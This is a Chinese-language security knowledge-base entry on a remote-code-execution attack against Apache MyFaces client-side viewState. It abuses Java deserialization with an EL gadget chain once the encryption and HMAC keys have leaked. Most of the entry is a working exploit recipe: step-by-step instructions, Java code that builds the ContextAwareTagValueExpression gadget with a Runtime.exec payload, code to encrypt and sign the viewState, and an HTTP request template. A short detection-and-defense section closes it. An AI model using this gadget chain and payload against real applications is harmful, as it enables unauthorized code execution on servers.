---
id: web-java-deserialization-myfaces-client-viewstate-el
title: MyFaces client viewState 反序列化：密钥已知时用 EL gadget 链 RCE
type: scenario
domain: web
path: web/java/deserialization
technique: myfaces-client-viewstate-deserialization
tags:
- java
- myfaces
- jsf
- viewstate
- deserialization
- el-injection
- gadget-chain
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:32:30+08:00'
  notes: 已对照原文与 11 张图核对：client viewState 在 Restore View 经 StateUtils.reconstruct(base64→解密→readObject)、默认先 HMAC 验签故需密钥、CodeQL 找到 ContextAwareTagValueExpression.hashCode→getMethodExpression→EL 链、HashMap key 承载 payload，均与原文一致；未验证点：原文未展示端到端命令回显，2.3.9 为分析目标版本而非受影响区间；server 端默认不可利用的结论正确
url: /docs/web/java/deserialization/web-java-deserialization-myfaces-client-viewstate-el/
draft: false
kb_aliases:
- MyFaces 反序列化
- JSF viewState 反序列化
- client viewState RCE
- ContextAwareTagValueExpression 链
- StateUtils.reconstruct
---

## 一句话结论

MyFaces 的 client 端 viewState 会在 Restore View 阶段对请求参数解密后直接 `readObject`；攻击者拿到配置中的 AES/HMAC 密钥后，可构造合法加密的 Gadget 序列化流，经 `ContextAwareTagValueExpression.hashCode` 触发 EL 表达式执行任意命令。

## 原理

- JSF 生命周期进入 `FacesServlet#service` 后，Restore View 阶段由 `ClientSideStateTokenProcessor#decode` 处理请求中的 `viewState`。
- `StateUtils.reconstruct()` 依次执行 Base64 解码 → 解密 → `getAsObject()`（即 `readObject`）。MyFaces 默认使用 AES/CBC/PKCS5Padding + HMAC，先验签再解密，因此 Padding Oracle 无效，必须先知道密钥。
- 密钥来自应用配置；若硬编码在 `web.xml`/配置文件中，且目标存在任意文件读取，就能取得密钥并伪造 viewState。
- Gadget 链：`HashMap` 反序列化时对 key 计算 `hashCode` → `ContextAwareTagValueExpression.hashCode` → `ValueExpressionLiteral.hashCode` → `ValueExpressionMethodExpression.hashCode` → `getMethodExpression()` → EL 求值。
- EL payload 形如 `${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("java.lang.Runtime.getRuntime().exec('calc')")}`，在 `getMethodExpression` 阶段执行。
- 序列化流需按目标实现压缩（DeflaterOutputStream）后加密，再按 `encrypted || MAC` 拼接并 Base64，放入 `viewState` 参数。

## 触发条件

- 目标使用 MyFaces（`org.apache.myfaces.core:myfaces-impl`，原文分析 2.3.9）。
- `javax.faces.STATE_SAVING_METHOD=client`（client 端 viewState）。
- 应用显式配置了 viewState 加密/签名密钥，且密钥可通过任意文件读取或配置泄露获得；未显式配置时密钥随机生成，无法利用。
- classpath 存在链所需类与 EL 实现（MyFaces 自带）。

## 利用步骤

1. 确认 JSF/MyFaces：请求参数含 `javax.faces.ViewState`，响应/页面出现 MyFaces 特征。
2. 读取 `web.xml` 等配置获取 `SECRET_KEY`/`MAC_KEY`（需配合任意文件读取）。
3. 用链构造恶意对象：`ContextAwareTagValueExpression` 包装 EL 表达式，放入 `HashMap` 的 key。
4. 序列化 → 压缩（如目标使用 DeflaterOutputStream）→ AES 加密 → HMAC → 拼接 → Base64。
5. 作为 `javax.faces.ViewState` 参数发送，触发 Restore View 反序列化。

## PoC

Gadget 构造核心：

```java
String exp = "${''.getClass().forName('javax.script.ScriptEngineManager')"
    + ".newInstance().getEngineByName('JavaScript')"
    + ".eval(\"java.lang.Runtime.getRuntime().exec('calc')\")}";

ExpressionFactory factory = new ExpressionFactoryImpl();
ELContext elContext = new StandardELContext(factory);
ValueExpression ve = factory.createValueExpression(elContext, exp, Object.class);
ValueExpressionMethodExpression veme = new ValueExpressionMethodExpression(ve);
TagAttribute tag = new TagAttributeImpl(null, "", "test", "test", "123");
ValueExpressionLiteral vel = new ValueExpressionLiteral(veme, Object.class);
ContextAwareTagValueExpression payload =
    new ContextAwareTagValueExpression(tag, vel);

HashMap<Object, String> map = new HashMap<>();
map.put(payload, "x");   // put/hashCode 触发链
```

输出编码（与目标密钥/算法匹配）：

```java
byte[] ser = serialize(map);                 // ObjectOutputStream
byte[] enc = aesEncrypt(ser, SECRET_KEY);    // AES/CBC/PKCS5Padding
byte[] mac = hmac(enc, MAC_KEY);             // HmacSHA1/SHA256
String viewState = Base64.getEncoder().encodeToString(concat(enc, mac));
```

请求：

```http
POST /app/index.xhtml HTTP/1.1
Content-Type: application/x-www-form-urlencoded

javax.faces.ViewState=<urlencoded viewState>&...
```

## 变体与关联

- 变体：server 端 viewState 默认 `SERIALIZE_STATE_IN_SESSION=false`，`deserializeView` 只对 `byte[]` 反序列化，且 session 中的 `SerializedViewCollection` 不可控，默认不可利用；若显式开启该配置，理论上可转向 session 注入。
- 关联：[[web-java-deserialization-jndi-ufida-sprmonitorservlet]]（另一个 Java 原生反序列化入口）；[[web-java-deserialization-comparator-rhino]]（hashCode/toString 触发型 gadget）；[[binary-pwn-sandbox-escape-graalvm-hostaccess-all-getclass-rce]]（EL/脚本引擎执行的另一环境）。
- 边界：原文给出完整 payload 生成代码与 CodeQL 链路径，但未展示端到端命令回显；且依赖“密钥泄露 + 任意文件读”，置信度定为 medium。

## 检测与防御

- 检测：`javax.faces.ViewState` 异常长度/Base64 内容；反序列化异常（`readObject`、`ContextAwareTagValueExpression`）；EL 表达式相关类出现在异常栈；请求中出现 `ScriptEngineManager`/`Runtime.exec` 特征。
- 防御：不要硬编码 viewState 密钥，使用随机密钥并保护配置文件；升级 MyFaces；对反序列化入口加类白名单/`ObjectInputFilter`；禁用不必要的 EL 求值；修复任意文件读取；将 viewState 存储改为 server 端并限制 session 写入。
